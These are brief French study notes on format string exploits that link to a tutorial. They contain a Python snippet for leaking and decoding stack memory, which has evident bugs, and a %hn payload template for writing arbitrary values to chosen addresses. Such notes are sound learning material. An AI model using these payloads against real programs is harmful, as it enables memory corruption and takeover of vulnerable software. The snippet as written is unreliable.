# Documentation 

https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

## Lire en mémoire 


```python 
print('%08x-'*200) #exploit en hex
l=s.split().replace("-"," ") #s=mem exploit 

m=[]
for i in range(len(l)):
        ba=byterray.fromhex(l[i])
        ba.reverse() #big 
        m.append(''.join(format(x,'c') for x in ba))
```

## Ecrire en mémoire 
 
- %n écrit sur 4 bytes-> adresse énorme en hexa 
- on écrit par groupe de 2 bytes avec %hn
- possible d'écrire byte par byte avec %hhn

0xdeadbeef = 0xdead (high) "+" 0xbeef (low)

[endian(adresse écriture low) + endian(addresse écriture high = low +2)]
%[hexa low à écrire - 8]x%[n contrôlé]$hn%[hexa abs((low-8)-(high-8)) à écrire]x%[n+1] $hn"')

